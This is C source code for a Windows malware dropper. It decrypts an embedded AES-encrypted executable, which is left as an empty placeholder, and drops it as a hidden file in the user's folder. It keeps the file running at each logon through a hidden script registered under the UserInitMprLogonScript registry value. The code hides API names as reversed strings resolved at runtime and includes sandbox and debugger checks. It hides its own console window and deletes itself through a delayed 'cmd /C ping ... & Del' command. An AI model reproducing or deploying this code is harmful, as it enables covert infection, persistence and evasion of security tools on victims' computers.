#include <windows.h>
#include <stdio.h>
#include<tchar.h>
#include <Lmcons.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include<winuser.h>
#include<windowsx.h>
#include <stdbool.h>
#include <strsafe.h>
#pragma comment (lib, "User32.lib")
#pragma comment (lib, "GDI32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#define BUFSIZE 80

//#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
int test_key(void);
void delMe();
void hide();
bool sandbox_check(void);
bool debug_check(void);
int create_key(char*);
void getUserNameFolder(void);
char loginScript [100] ;
char exePath [100] ;
BOOL (WINAPI * pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX lpBuffer);
BOOL (WINAPI * pCreateProcessA)(  LPCSTR  lpApplicationName,LPSTR lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);
LSTATUS (WINAPI * pRegCloseKey)(  HKEY hKey);
BOOL (WINAPI * pGetUserNameA)(  LPSTR   lpBuffer,  LPDWORD pcbBuffer);
BOOL (WINAPI * pIsDebuggerPresent)();
DWORD (WINAPI * pGetTickCount) ();
int decrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}



int main(void) {
	
	if (sandbox_check())
	{
           // return 0;
	}
	if (debug_check())
	{
            //return 0;
	}
	hide();
	
    
	char key[] = {0x89,0xab,0x51,0x33,0x0a,0xcd,0x32,0x37,0xb4,0xc6,0x06,0x2e,0xb8,0xca};
	unsigned char exe_payload[] = {};//put here the aes encrypted prog.exe
	unsigned char  script_payload[] ={"@ECHO OFF"};
	unsigned int exe_len = sizeof(exe_payload);
	FILE *exe ,*script;
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	
	getUserNameFolder();
	SetCurrentDirectory(loginScript);
	//printf(loginScript);
	strcat(exePath,loginScript);
	strcat(exePath,strrev("exe.sgolcvs\\"));
	strcat(loginScript,strrev("tab.tpircsnigol\\"));
	//printf(script_payload);
	//strcat(script_payload,loginScript);
	//printf(script_payload);
	//unsigned int script_len = sizeof(script_payload);
	//printf(loginScript);
    if(test_key()==2) create_key(loginScript);
	script = fopen(strrev("tab.tpircsnigol"),"w");
	
    fwrite("@ECHO OFF",strlen("@ECHO OFF"),1,script); 
	fwrite("\n",1,1,script);
	fwrite(exePath,strlen(exePath),1,script); 
	fclose(script);
    SetFileAttributes(strrev("tab.tpircsnigol"),FILE_ATTRIBUTE_HIDDEN);	
	decrypt((char *) exe_payload, exe_len, key, sizeof(key));
		
	exe = fopen(strrev("exe.sgolcvs"),"wb");
	
    fwrite(exe_payload,sizeof(exe_payload),1,exe); 
	fclose(exe);
	SetFileAttributes(exePath,FILE_ATTRIBUTE_HIDDEN);
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
	
	pCreateProcessA = GetProcAddress(GetModuleHandle("kernel32.dll"),strrev("AssecorPetaerC"));
	pCreateProcessA( NULL,   // No module name (use command line)
        strrev("exe.sgolcvs"),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )  ;
    delMe();
	return 0;
}


void getUserNameFolder(void)
{
	
	TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
	pGetUserNameA = GetProcAddress(GetModuleHandle("Advapi32.dll"),strrev("AemaNresUteG"));
    pGetUserNameA((TCHAR*)username, &size);
	strcat(loginScript,strrev("\\sresu\\:c"));
	strcat(loginScript,username);
	//strcat(loginScript,"\\data");
	//printf(loginScript);
}
int test_key(void)
{
   int check;
   HKEY hKey;
   char path[BUFSIZE];
   DWORD buf_length=BUFSIZE;
   int reg_key;
 
   reg_key=RegOpenKeyEx(HKEY_CURRENT_USER,strrev("tnemnorivnE"),0,KEY_QUERY_VALUE,&hKey);
   if(reg_key!=0)
   {   
       check=1;
       return check;
   }       
 
   reg_key=RegQueryValueEx(hKey,strrev("tpircSnogoLrpMtinIresU"),NULL,NULL,(LPBYTE)path,&buf_length);
 
   if((reg_key!=0)||(buf_length>BUFSIZE))
       check=2;
   if(reg_key==0)
       check=0;
   pRegCloseKey = GetProcAddress(GetModuleHandle("Advapi32.dll"),strrev("yeKesolCgeR")); 
   pRegCloseKey(hKey);
   return check; 
}
 
int create_key(char *path)
{ 
       int reg_key,check;
 
       HKEY hkey;
 
       reg_key=RegCreateKey(HKEY_CURRENT_USER,strrev("tnemnorivnE"),&hkey);
       if(reg_key==0)
       {
               RegSetValueEx((HKEY)hkey,strrev("tpircSnogoLrpMtinIresU"),0,REG_SZ,(BYTE *)path,strlen(path));
               check=0;
               return check;
       }
       if(reg_key!=0)
               check=1;
 
       return check;
}
bool sandbox_check(void) {
	        pGetTickCount = GetProcAddress(GetModuleHandle("Kernel32.dll"),strrev("tnuoCkciTteG")); 
	        DWORD startTime = pGetTickCount();
			//printf("time = %lu", startTime);
			if (startTime < 3600000) {
					   return true;
					   
			}
            MEMORYSTATUSEX status;
            DWORD max = 3294496257; // 4GB
            status.dwLength = sizeof(status);
			pGlobalMemoryStatusEx = GetProcAddress(GetModuleHandle("kernel32.dll"),strrev("xEsutatSyromeMlabolG"));
            pGlobalMemoryStatusEx(&status);
			//printf("mem = %lu", (DWORD)status.ullTotalPhys);
            if ((DWORD)status.ullTotalPhys < max) {
                        return true;
            }
			int x;
			//scanf("%d", &x);
            return false;
}
bool debug_check(void) {
	pIsDebuggerPresent= GetProcAddress(GetModuleHandle("Kernel32.dll"),strrev("tneserPreggubeDsI"));
	if (pIsDebuggerPresent())
    {
	   
       return true ;
    }
	 //printf("debug");   
     return false;
}
void delMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    //printf("here");
    GetModuleFileName(NULL, szModuleName, MAX_PATH);
    //printf("here");
    StringCbPrintf(szCmd, 2 * MAX_PATH, "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"", szModuleName);
    //pCreateProcessA = GetProcAddress(GetModuleHandle("kernel32.dll"),strrev("AssecorPetaerC"));
    pCreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
void hide()
{
	HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth=FindWindowA(strrev("ssalCwodniWelosnoC"),NULL);
    ShowWindow(stealth,0);
}